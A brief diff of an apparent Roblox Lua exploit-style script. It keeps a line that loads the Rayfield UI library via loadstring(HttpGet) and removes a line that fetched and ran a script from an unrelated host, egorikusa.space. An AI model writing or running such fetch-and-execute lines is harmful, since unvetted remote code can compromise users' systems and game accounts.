@@ -1,5 +1,4 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-local AdoptMe = loadstring(game:HttpGet("https://egorikusa.space/5a961877094104d81339903a.lua", true))()
 
 -- Check if SecureMode is available
 if Rayfield.SecureMode then 
